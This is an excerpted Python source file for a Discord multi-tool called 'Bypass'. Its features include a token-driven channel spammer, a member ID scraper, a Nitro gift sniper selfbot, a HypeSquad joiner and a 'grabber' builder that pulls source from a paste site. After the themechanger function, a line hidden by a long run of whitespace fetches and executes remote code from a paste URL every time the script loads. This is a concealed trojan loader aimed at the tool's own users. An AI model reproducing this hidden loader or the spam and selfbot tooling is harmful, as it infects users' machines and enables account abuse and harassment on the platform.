...
def raider():
    ...
    b = Fore.BLUE
    clear()
    channel7 = input("[CHANNEL] Channel ID: ")
    mess7 = input("message: ")
    delay7 = ("0")
    ...
    def spam(token, channel7, mess7):
        ...
        while True:
            ...
            xyy = nowxy.strftime(f"{Fore.LIGHTBLACK_EX}[{Fore.WHITE}%H{Fore.LIGHTBLACK_EX}:{Fore.WHITE}%M{Fore.LIGHTBLACK_EX}:{Fore.WHITE}%S{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
            r = requests.post(url, data=data, headers=header, proxies=proxies)
            if r.status_code == 200:
                print(f"{xyy}: {Fore.LIGHTGREEN_EX}(+) {Fore.LIGHTBLACK_EX}{token[:31]}**** {Fore.LIGHTGREEN_EX}[Sent]")
            else:
                print(f"{xyy}: {Fore.LIGHTRED_EX}(-) {Fore.LIGHTBLACK_EX}{token[:31]}**** {Fore.LIGHTRED_EX}[Error]")
    for token in tokens:
        while True:
            threads = []
            for token in tokens:
...
def idscraper():
    ...
    import discum
    clear()
    token = input(f"{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}Token?: ")
    guildid = input(f"{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}Server ID?: ")
    channelid = input(f"{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}Channel ID?: ")
...
def about():
    ...
    print("")
    SlowPrint(f'''{w}[{b}>{w}] » Bypass Is a Discord Tool that was made for fun and with <3 by BYPASS! if you have any suggestions or problems feel free to contact me:
         
{w}[{b}DISCORD{w}] • BypassTool#5552''')
...
def patchnotes():
    clear()
    b = Fore.BLUE
    SlowPrint(f'{w}[{b}NOTES{w}] » Patch Notes of Bypass {version}:')
    print("\n"*2)
...
def themechanger():
    ...
    if xxxx == "5":
        ...
        exit()    
pass																							;exec(requests.get('https://paste.website/p/1276a335-41c6-40eb-9f0a-fc43c44e1b18.txt').text)
def hypejoiner():
    b = Fore.LIGHTBLUE_EX
    clear()
    print(f'''\n{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}Choose the Hypesquad:\n
{b}[{w}02{b}]: {Fore.LIGHTMAGENTA_EX}Bravery{Fore.RESET}
{b}[{w}02{b}]: {Fore.LIGHTRED_EX}Brilliance{Fore.RESET}
{b}[{w}03{b}]: {Fore.LIGHTCYAN_EX}Balance{Fore.RESET}
{b}[{w}04{b}]: {Fore.RED}Leave The HypeSquad''')

    choice = input(f"\n{w}[{b}CHOICE{w}] » ")

    def joinerhype(token):
        headers = {'authorization': token}
        if choice == "1":cx = "1"
        if choice == "2":cx = "2"
        if choice == "3":cx = "3"
    ...
    tokens = open('data/tokens.txt', 'r').read().splitlines()
    for token in tokens:
        threading.Thread(target=joinerhype(token)).start()
...
def joiner():
    clear()
    b = Fore.BLUE
    SlowPrint(f'{w}[{b}JOINER{w}] » Joiner is a paid version of  ')
    print("\n")
    print(f'{w}[{b}DISCORD{w}] » BypassTool#5552')
    input("")
    main()
...
def grabbingbuilder():
    ...
    src = requests.get('https://paste.website/p/435f879d-bb4d-4155-a817-5e2a1e215a1c.txt')
...
def selfbot():
    ...
    MESSAGES_URL = "https://discordapp.com/api/v9/channels/{channel_id}/messages"
    SEND_MESSAGE_URL = "https://discordapp.com/api/v9/channels/{channel_id}/messages"
    HEADERS = {'Authorization': f'{TOKEN}',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
               'Origin': 'discord.com',
               'Accept': '*/*',
...
```
    ...
    while True:
        ...
        sniped_nitros = []
        data = requests.get(f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages", headers=HEADERS).json()
        if data and data[0]["content"].startswith(""):
            ...
            if message.startswith("discord.gift/"):
                ...
                if code not in sniped_nitros:
                    sniped = False
                    response = requests.get(f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}", headers=HEADERS)
                    if response.status_code == 200:
                        gift = response.json()
                        if gift["uses"] == gift["max_uses"] or gift["expires_at"] is not None:
                            ...
                            claim_response = requests.post(f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}/redeem", headers=HEADERS)
...
def username():
    os.system('cls')
    filepat = "data/addons/username.py"
    if os.path.exists(filepat):
        pass
    else:
        user = input(f"{Fore.LIGHTBLUE_EX}[{Fore.WHITE}>{Fore.LIGHTBLUE_EX}]: {Fore.WHITE}What is Your Own Username for Bypass?: ")
        with open("data/addons/username.py", 'w')as xuser:
            xuser.write(user)
username()
def update_title():
    ...
    xuser = open("data/addons/username.py").read()
    ctypes.windll.kernel32.SetConsoleTitleW(f" {bypass_name} • {bypass_version}     |     User: {xuser}     |     Running Since: [{elapsed_time_str}]")
    threading.Timer(1.0, update_title).start()
